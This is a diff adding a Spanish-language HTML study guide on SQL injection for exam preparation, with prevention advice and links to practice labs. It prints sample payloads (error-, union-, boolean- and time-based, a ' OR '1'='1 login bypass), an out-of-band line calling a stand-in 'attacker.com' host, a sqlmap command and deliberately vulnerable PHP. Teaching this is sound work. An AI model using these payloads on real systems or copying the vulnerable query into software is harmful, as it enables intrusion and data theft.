@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Guía Completa de SQL Injection</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background: #f5f5f5; }
+        header { background: #1f2833; color: #c5c6c7; padding: 1rem; text-align: center; }
+        nav { background: #0b0c10; }
+        nav ul { list-style: none; margin: 0; padding: .5rem 1rem; display: flex; flex-wrap: wrap; }
+        nav li { margin-right: 1rem; }
+        nav a { color: #66fcf1; text-decoration: none; font-weight: bold; }
+        nav a:hover { text-decoration: underline; }
+        .container { max-width: 900px; margin: 2rem auto; background: #fff; padding: 2rem; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+        section { margin-bottom: 2rem; }
+        h2 { color: #0b0c10; border-bottom: 2px solid #c5c6c7; padding-bottom: .5rem; }
+        p { margin: .8rem 0; }
+        pre { background: #e8e8e8; padding: 1rem; overflow-x: auto; border-radius: 4px; }
+        code { font-family: 'Courier New', Courier, monospace; }
+        details { background: #f0f0f0; padding: .8rem; margin-top: 1rem; border-left: 4px solid #45a29e; border-radius: 4px; }
+        summary { cursor: pointer; font-weight: bold; }
+        .copy-btn { margin-top: .5rem; padding: .4rem .8rem; background: #45a29e; color: #fff; border: none; border-radius: 3px; cursor: pointer; }
+        .copy-btn:hover { background: #397d6f; }
+        footer { text-align: center; padding: 1rem; font-size: .9rem; color: #666; }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Guía Completa de SQL Injection</h1>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#definicion">Definición</a></li>
+            <li><a href="#tipos">Tipos</a></li>
+            <li><a href="#basicos">Ejemplos Básicos</a></li>
+            <li><a href="#avanzados">Ejemplos Avanzados</a></li>
+            <li><a href="#deteccion">Detección & Herramientas</a></li>
+            <li><a href="#prevencion">Prevención</a></li>
+            <li><a href="#examen">Consejos para Examen</a></li>
+            <li><a href="#recursos">Recursos</a></li>
+        </ul>
+    </nav>
+    <div class="container">
+        <section id="definicion">
+            <h2>1. Definición</h2>
+            <p>SQL Injection (SQLi) es una vulnerabilidad que permite inyectar código SQL malicioso en las consultas que una aplicación envía a su base de datos. Un atacante puede así evadir autenticaciones, extraer o modificar datos sensibles, e incluso ejecutar comandos administrativos en la base.</p>
+        </section>
+        <section id="tipos">
+            <h2>2. Tipos de SQLi</h2>
+            <details>
+                <summary>In-Band (Clásico)</summary>
+                <p><strong>Error-Based:</strong> Genera errores intencionados para revelar información de tablas y columnas.</p>
+                <pre><code>SELECT * FROM users WHERE id = 1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a);</code></pre>
+                <button class="copy-btn">Copiar código</button>
+                <p><strong>Union-Based:</strong> Utiliza <code>UNION</code> para combinar resultados legítimos y arbitrarios.</p>
+                <pre><code>http://site/item.php?id=1 UNION SELECT user(), database(); -- </code></pre>
+                <button class="copy-btn">Copiar código</button>
+            </details>
+            <details>
+                <summary>Blind (Inferential)</summary>
+                <p><strong>Boolean-Based:</strong> Envía condiciones True/False y observa diferencias en las respuestas.</p>
+                <pre><code>?id=1 AND SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)='a'</code></pre>
+                <button class="copy-btn">Copiar código</button>
+                <p><strong>Time-Based:</strong> Introduce retardos y mide latencia para inferir datos.</p>
+                <pre><code>?id=1 IF(ASCII(SUBSTRING((SELECT user()),1,1))=97, SLEEP(5), 0)</code></pre>
+                <button class="copy-btn">Copiar código</button>
+            </details>
+            <details>
+                <summary>Out-of-Band</summary>
+                <p>Exfiltra datos a través de canales externos (DNS, HTTP).</p>
+                <pre><code>id=1; EXEC xp_dirtree 'http://attacker.com/'; --</code></pre>
+                <button class="copy-btn">Copiar código</button>
+            </details>
+        </section>
+        <section id="basicos">
+            <h2>3. Ejemplos Básicos</h2>
+            <pre><code>&lt;?php
+$user = $_POST['user'];
+$pass = $_POST['pass'];
+$sql = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
+$result = mysqli_query($conn, $sql);
+?&gt;</code></pre>
+            <button class="copy-btn">Copiar código</button>
+            <p>Inyección con <code>' OR '1'='1</code> elude la autenticación.</p>
+        </section>
+        <section id="avanzados">
+            <h2>4. Ejemplos Avanzados</h2>
+            <details>
+                <summary>Segunda Fase (Second-Order)</summary>
+                <p>El payload se almacena primero y se ejecuta en una consulta posterior.</p>
+            </details>
+            <details>
+                <summary>Out-of-Band Avanzado</summary>
+                <p>Uso de <code>LOAD_FILE()</code> o funciones de red para robar archivos.</p>
+            </details>
+        </section>
+        <section id="deteccion">
+            <h2>5. Detección y Herramientas</h2>
+            <ul>
+                <li><strong>Burp Suite / OWASP ZAP:</strong> Interceptación y modificación de peticiones.</li>
+                <li><strong>sqlmap:</strong> Automatiza detección y explotación (<code>sqlmap -u "http://target.com/page?id=1" --batch --dbs</code>).</li>
+                <li><strong>Revisión de código:</strong> Buscar strings concatenados sin sanitización.</li>
+            </ul>
+        </section>
+        <section id="prevencion">
+            <h2>6. Prevención y Buenas Prácticas</h2>
+            <ul>
+                <li>Sentencias preparadas (<code>PDO</code>, <code>mysqli</code>).</li>
+                <li>ORMs y Query Builders.</li>
+                <li>Whitelist de entradas.</li>
+                <li>Escapado de caracteres (último recurso).</li>
+                <li>Principio de mínimos privilegios.</li>
+                <li>WAF correctamente configurado.</li>
+            </ul>
+            <p>Ejemplo en PHP con PDO:</p>
+            <pre><code>$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
+$stmt->execute([$email]);
+$user = $stmt->fetch();</code></pre>
+            <button class="copy-btn">Copiar código</button>
+        </section>
+        <section id="examen">
+            <h2>7. Consejos para el Examen</h2>
+            <ul>
+                <li>Comprende cada tipo de SQLi y practica cada variante.</li>
+                <li>Domina <code>UNION SELECT</code>, <code>SUBSTR</code>, <code>ASCII</code>, <code>SLEEP/WAITFOR</code>.</li>
+                <li>Interpreta errores SQL con precisión.</li>
+                <li>Usa laboratorios y plataformas como DVWA, bWAPP, HackTheBox.</li>
+                <li>Revisa CVEs destacadas y reportes OWASP.</li>
+            </ul>
+        </section>
+        <section id="recursos">
+            <h2>8. Recursos Adicionales</h2>
+            <ul>
+                <li><a href="https://owasp.org/www-project-top-ten/" target="_blank">OWASP Top 10 - Injection</a></li>
+                <li><a href="https://github.com/OWASP/Security Shepherd" target="_blank">Security Shepherd</a></li>
+                <li><a href="https://www.hackthebox.com/" target="_blank">HackTheBox</a></li>
+            </ul>
+        </section>
+    </div>
+    <script>
+        document.querySelectorAll('.copy-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const code = btn.previousElementSibling.textContent;
+                navigator.clipboard.writeText(code);
+                btn.textContent = '¡Copiado!';
+                setTimeout(() => btn.textContent = 'Copiar código', 2000);
+            });
+        });
+    </script>
+    <footer>
+        <p>Preparado por tu compañero de aprendizaje. ¡A por todas!</p>
+    </footer>
+</body>
+</html>
